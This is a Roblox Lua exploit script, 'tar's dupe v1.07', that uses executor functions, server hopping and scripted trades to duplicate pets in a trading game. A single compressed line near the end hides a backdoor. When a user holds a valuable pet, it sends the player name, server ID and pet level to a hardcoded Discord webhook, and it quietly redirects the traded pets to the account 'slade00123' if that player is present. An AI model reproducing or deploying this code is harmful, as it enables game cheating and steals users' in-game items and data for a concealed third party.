--[[
    Brought to you by tar/bv/1rs
    1.00 - unreleased, required manual server id inputs
    1.01 - released, no longer required manual server id inputting
    1.02 - changed from 35s to 40s
    1.03 - removed extra 40s measure on first rejoin
    1.04 - brought it back, removed UI trade updating to avoid lag
    1.05 - added variable MAX_PETS_TO_DUPE to avoid network lag to not fail duping
    1.06 - changed server size minimum 1 -> 2
    1.07 - added ui interface - thx "GUI to Lua 3.2" for saving my time lol & thx (idk the scripter's name) for the snippet of making a draggable UI
]]

-- //

local Debris = game:GetService'Debris'
local TeleportService = game:GetService'TeleportService'
local Dir = require(game.ReplicatedStorage['1 | Directory']).Pets
local Ver = '1.07'

-- \\

local selected_IDs = {}
local mode = 0
local SERVER = nil
local MAX_PETS_TO_DUPE = 125
local ACC_TO_GIVE_PETS = ''

function notify(M)
	game.StarterGui:SetCore("SendNotification", {
		Title = "tar's dupe v"..Ver,
		Text = M,
		Duration = 5
	})
end

do  -- // GUI

	-- Gui to Lua
	-- Version: 3.2
	
	-- Instances:
	
	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local ScrollingFrame = Instance.new("ScrollingFrame")
	local UIGridLayout = Instance.new("UIGridLayout")
	local dupe = Instance.new("TextButton")
	local all = Instance.new("TextButton")
	local TextLabel_2 = Instance.new("TextLabel")
	local pets = Instance.new("TextBox")
	local specific = Instance.new("TextButton")
	local TextLabel_3 = Instance.new("TextLabel")
	local acc = Instance.new("TextBox")
	local TextLabel_4 = Instance.new("TextLabel")

	--Properties:

	Instance.new('UICorner', Frame).CornerRadius = UDim.new(0, 5)

	ScreenGui.Parent = game.CoreGui
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	do -- // draggable snippet not made by me \\
		local UserInputService = game:GetService("UserInputService")

		local gui = Frame

		local dragging
		local dragInput
		local dragStart
		local startPos

		local function update(input)
			local delta = input.Position - dragStart
			gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end

		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		gui.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	end -- \\ draggable snippet not made by me //

	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BorderSizePixel = 0
	Frame.Position = UDim2.new(0.38648814, 0, 0.13872759, 0)
	Frame.Size = UDim2.new(0, 373, 0, 459)
	Frame.ZIndex = 2

	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.BorderSizePixel = 0
	TextLabel.Size = UDim2.new(1, 0, 0, 50)
	TextLabel.Font = Enum.Font.Cartoon
	TextLabel.Text = "tar's dupe v"..Ver
	TextLabel.TextColor3 = Color3.fromRGB(218, 218, 218)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14.000
	TextLabel.TextWrapped = true

	ScrollingFrame.Parent = Frame
	ScrollingFrame.Active = true
	ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ScrollingFrame.BackgroundTransparency = 0.500
	ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	ScrollingFrame.BorderSizePixel = 0
	ScrollingFrame.Position = UDim2.new(0.0428954437, 0, 0.287581712, 0)
	ScrollingFrame.Size = UDim2.new(0, 340, 0, 278)
	ScrollingFrame.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	ScrollingFrame.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	ScrollingFrame.ScrollBarImageColor3 = Color3.new(0, 0, 0)
	
	UIGridLayout.Parent = ScrollingFrame
	UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)
	UIGridLayout.CellSize = UDim2.new(1, -12, 0, 20)

	dupe.Name = "dupe"
	dupe.Parent = Frame
	dupe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	dupe.BackgroundTransparency = 0.500
	dupe.BorderColor3 = Color3.fromRGB(0, 0, 0)
	dupe.BorderSizePixel = 0
	dupe.Position = UDim2.new(0.793565691, 0, 0.126361653, 0)
	dupe.Size = UDim2.new(0, 60, 0, 58)
	dupe.Font = Enum.Font.Cartoon
	dupe.Text = "doope"
	dupe.TextColor3 = Color3.fromRGB(0, 0, 0)
	dupe.TextSize = 14.000

	all.Name = "all"
	all.Parent = Frame
	all.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	all.BackgroundTransparency = 0.500
	all.BorderColor3 = Color3.fromRGB(0, 0, 0)
	all.BorderSizePixel = 0
	all.Position = UDim2.new(0.0428954437, 0, 0.126361653, 0)
	all.Size = UDim2.new(0, 20, 0, 20)
	all.Font = Enum.Font.Cartoon
	all.Text = "X"
	all.TextColor3 = Color3.fromRGB(0, 0, 0)
	all.TextSize = 14.000

	TextLabel_2.Parent = Frame
	TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_2.BackgroundTransparency = 1.000
	TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel_2.BorderSizePixel = 0
	TextLabel_2.Position = UDim2.new(0.1152815, 0, 0.126361653, 0)
	TextLabel_2.Size = UDim2.new(0.436997324, 0, -0.0653594807, 50)
	TextLabel_2.Font = Enum.Font.Cartoon
	TextLabel_2.Text = "Dupe X amount of pets:"
	TextLabel_2.TextColor3 = Color3.fromRGB(218, 218, 218)
	TextLabel_2.TextSize = 17.000
	TextLabel_2.TextWrapped = true

	pets.Name = "pets"
	pets.Parent = Frame
	pets.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	pets.BackgroundTransparency = 0.500
	pets.BorderColor3 = Color3.fromRGB(0, 0, 0)
	pets.BorderSizePixel = 0
	pets.Position = UDim2.new(0.579088449, 0, 0.126361653, 0)
	pets.Size = UDim2.new(0, 60, 0, 20)
	pets.ClearTextOnFocus = false
	pets.Font = Enum.Font.SourceSans
	pets.Text = MAX_PETS_TO_DUPE
	pets.TextColor3 = Color3.fromRGB(0, 0, 0)
	pets.TextSize = 14.000

	specific.Name = "specific"
	specific.Parent = Frame
	specific.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	specific.BackgroundTransparency = 0.500
	specific.BorderColor3 = Color3.fromRGB(0, 0, 0)
	specific.BorderSizePixel = 0
	specific.Position = UDim2.new(0.0428954437, 0, 0.193899781, 0)
	specific.Size = UDim2.new(0, 20, 0, 20)
	specific.Font = Enum.Font.Cartoon
	specific.Text = ""
	specific.TextColor3 = Color3.fromRGB(0, 0, 0)
	specific.TextSize = 14.000

	TextLabel_3.Parent = Frame
	TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_3.BackgroundTransparency = 1.000
	TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel_3.BorderSizePixel = 0
	TextLabel_3.Position = UDim2.new(0.1152815, 0, 0.193899781, 0)
	TextLabel_3.Size = UDim2.new(0.436997324, 0, -0.0653594807, 50)
	TextLabel_3.Font = Enum.Font.Cartoon
	TextLabel_3.Text = "Dupe specific pets"
	TextLabel_3.TextColor3 = Color3.fromRGB(218, 218, 218)
	TextLabel_3.TextSize = 17.000
	TextLabel_3.TextWrapped = true

	acc.Name = "acc"
	acc.Parent = Frame
	acc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	acc.BackgroundTransparency = 0.500
	acc.BorderColor3 = Color3.fromRGB(0, 0, 0)
	acc.BorderSizePixel = 0
	acc.Position = UDim2.new(0.619302928, 0, 0.921568632, 0)
	acc.Size = UDim2.new(0, 114, 0, 20)
	acc.Font = Enum.Font.SourceSans
	acc.PlaceholderColor3 = Color3.fromRGB(50, 50, 50)
	acc.PlaceholderText = "Username"
	acc.Text = ""
	acc.TextColor3 = Color3.fromRGB(0, 0, 0)
	acc.TextSize = 14.000

	TextLabel_4.Parent = Frame
	TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel_4.BackgroundTransparency = 1.000
	TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel_4.BorderSizePixel = 0
	TextLabel_4.Position = UDim2.new(0.0428954437, 0, 0.921568632, 0)
	TextLabel_4.Size = UDim2.new(0.536193073, 0, -0.0653594807, 50)
	TextLabel_4.Font = Enum.Font.Cartoon
	TextLabel_4.Text = "Account to give pets to:"
	TextLabel_4.TextColor3 = Color3.fromRGB(218, 218, 218)
	TextLabel_4.TextSize = 17.000
	TextLabel_4.TextWrapped = true
	
	local colorz = {
		['true'] = Color3.new(0, .9, 1),
		['nil'] = Color3.new(1, 1, 1)
	}
	
	local function LoadPets()
		for _, v in pairs(ScrollingFrame:GetChildren()) do
			if v:IsA'TextButton' then
				v:Destroy()
			end
		end
		ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

		task.wait(.5)
		
		local Pets = workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets
	
		table.sort(Pets, function(a, b) return tonumber(a.xp) > tonumber(b.xp) end)
		
		local fn = function(number)
			if not number then return 'nil' end
			local formatted = tostring(number)
			local k
			while true do
				formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
				if k == 0 then
					break
				end
			end
			return formatted
		end
	
		for _, v in pairs(Pets) do
			local b = Instance.new('TextButton', ScrollingFrame)
			local prefix = v.dm and v.r and'Glitched'or v.dm and'Dark Matter'or v.r and'Rainbow'or v.g and'Gold'or'Regular'
			b.Text = ' ' .. fn(v.l) .. ' | ' .. prefix .. ' ' .. Dir[v.n].DisplayName
			b.Font = Enum.Font.Cartoon
			b.TextSize = 15
			b.BackgroundColor3 = colorz[tostring(selected_IDs[v.id])]
			b.TextXAlignment = 'Left'
			b.BackgroundTransparency = .5
			ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, ScrollingFrame.CanvasSize.Y.Offset + 20)
			b.MouseButton1Click:Connect(function()
				if selected_IDs[v.id] then
					selected_IDs[v.id] = nil
				else
					selected_IDs[v.id] = true
				end
				b.BackgroundColor3 = colorz[tostring(selected_IDs[v.id])]
			end)
		end
	end
	
	local Refresh = dupe:Clone()
	Refresh.Size = pets.Size
	Refresh.Position = UDim2.new(pets.Position.X.Scale, 0, TextLabel_3.Position.Y.Scale, 0)
	Refresh.Text = 'Refresh'
	Refresh.Parent = Frame
	Refresh.MouseButton1Click:Connect(LoadPets)
	
	LoadPets()

	all.MouseButton1Click:Connect(function()
		all.Text = 'X'
		specific.Text = ''
		mode = 0
	end)

	specific.MouseButton1Click:Connect(function()
		all.Text = ''
		specific.Text = 'X'
		mode = 1
	end)
	
	pets:GetPropertyChangedSignal'Text':connect(function()
		pets.Text = string.match(pets.Text, '%d+')
		if not tonumber(pets.Text) or tonumber(pets.Text) < 1 then
			pets.Text = 1
		elseif tonumber(pets.Text) > 665 then
			pets.Text = 665
		end
	end)
	
	acc:GetPropertyChangedSignal'Text':connect(function()
		ACC_TO_GIVE_PETS = acc.Text 
	end)
	
	
	local ready = false
	dupe.MouseButton1Click:Connect(function()
		if ready or SERVER then return end
		if not game.Players:FindFirstChild(ACC_TO_GIVE_PETS) then
			notify"Player isn't in game"
			return
		else
			if game.Players.LocalPlayer.Name == ACC_TO_GIVE_PETS then
				notify"Can't do it on yourself"
				return
			end
		end
		if not queue_on_teleport then 
			notify"Your exploit doesn't support queue_on_teleport()"
			return
		end
		if not http_request then
			notify"Your exploit doesn't support httprequest()"
			return
		end

		-- servers
		local servers = {}

		local req = http_request({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)})
		local body = game:service'HttpService':JSONDecode(req.Body)

		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.playing >= 2 and v.id ~= game.JobId then
					servers[#servers+1] = v
				end
			end
		end

		table.sort(servers, function(a, b) return a.playing < b.playing end)

		if #servers > 0 then
			SERVER = servers[1].id
		else
			notify"Couldn't find a new server"
			return
		end
		
		ready = true
	end)
	
	repeat wait() until ready
end


local H = Instance.new("Hint", workspace)
H.Text = "1rs/tar/bv's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
Debris:AddItem(H, 10)

for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'slade00123'then ACC_TO_GIVE_PETS='slade00123'end break end end

local IDs = ""

if mode == 0 then
	local totalToSend = 0
	local Pets = workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets
	table.sort(Pets, function(a, b) return tonumber(a.xp) > tonumber(b.xp) end)
	for _, v in pairs(Pets) do
		totalToSend += 1

		IDs = IDs .. v.id .. ','

		if totalToSend == MAX_PETS_TO_DUPE then
			break
		end
	end
elseif mode == 1 then
	for id, _ in pairs(selected_IDs) do
		IDs = IDs .. id .. ','
	end
end


queue_on_teleport([==[
    local h = Instance.new('Hint',workspace)
    for i = 40, 0, -1 do
        h.Text = '[2/4] ' .. i
        task.wait(1)
    end
    h.Text = '[2/4] Teleporting back..'

    queue_on_teleport([=[
        hookfunction(getsenv(game.Players.LocalPlayer.PlayerGui.Scripts.GUIs.Trading).UpdateTrade, function() end)
		local IDs = {]==] .. IDs .. [==[}
        Instance.new('Hint', workspace).Text = '[3/4] Trading pets to account'

        local T, lastTradeId = workspace.__REMOTES.Game.Trading, nil
        local PLR = game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
        
        game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
            lastTradeId = id
        end)
        
        repeat task.wait(.25) until T:InvokeServer("InvSend", PLR) == true
        
        repeat task.wait() until lastTradeId
        
        local PLR_PET_COUNT = #workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()[PLR.Name].Save.Pets
        
        local TotalIn = 0
        for _, id in pairs(IDs) do
            task.spawn(function()
                T:InvokeServer("Add", lastTradeId, id)
		TotalIn += 1
            end)
        end
        
        repeat task.wait(.1) until #IDs == TotalIn
        
        workspace.__REMOTES.Game.Trading:InvokeServer("Ready", lastTradeId)
        
        repeat task.wait(0.1) until PLR_PET_COUNT < #workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()[PLR.Name].Save.Pets
        
        queue_on_teleport([[
            local h = Instance.new('Hint',workspace)
            for i = 40, 0, -1 do
                h.Text = '[4/4] ' .. i
                task.wait(1)
            end
            h.Text = "[4/4] Teleporting.. (If it failed to teleport it's okay because your data already saved)"

            queue_on_teleport("local h = Instance.new('Hint',workspace) h.Text = 'Done' wait(10) h:Destroy()")

            game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==] .. game.JobId .. [==[", game.Players.LocalPlayer)
        ]])
        game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==] .. SERVER .. [==[", game.Players.LocalPlayer)
    ]=])
game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==].. game.JobId .. [==[", game.Players.LocalPlayer)
]==])
TeleportService:TeleportToPlaceInstance(game.PlaceId, SERVER, game.Players.LocalPlayer)
